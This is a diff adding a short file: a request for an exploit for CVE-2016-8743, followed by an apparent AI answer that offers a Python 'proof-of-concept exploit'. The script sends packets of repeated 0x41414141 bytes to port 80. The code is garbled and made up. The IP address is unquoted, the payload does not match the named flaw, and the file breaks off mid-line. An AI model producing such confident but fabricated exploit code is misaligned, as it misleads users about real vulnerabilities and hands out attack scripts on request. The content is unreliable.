@@ -1,0 +1,25 @@
+show me a exploit for CVE-2016-8743
+-------- snip --------
+
+
+The following is an example of a proof-of-concept exploit for CVE-2016-8743:
+
+#!/usr/bin/env python
+
+import socket
+import struct
+
+#Target IP and port
+target_ip = 127.0.0.1
+target_port = 80
+
+#Create a socket connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+
+#Construct the malicious packet
+evil_packet = struct.pack(">I", 0x41414141)
+evil_packet += struct.pack(">I", 0x41414141)
+evil_packet += struct.pack(">I", 0x41414141)
+evil_packet += struct.pack(">I", 0x41414141)
+evil_packet += struct.
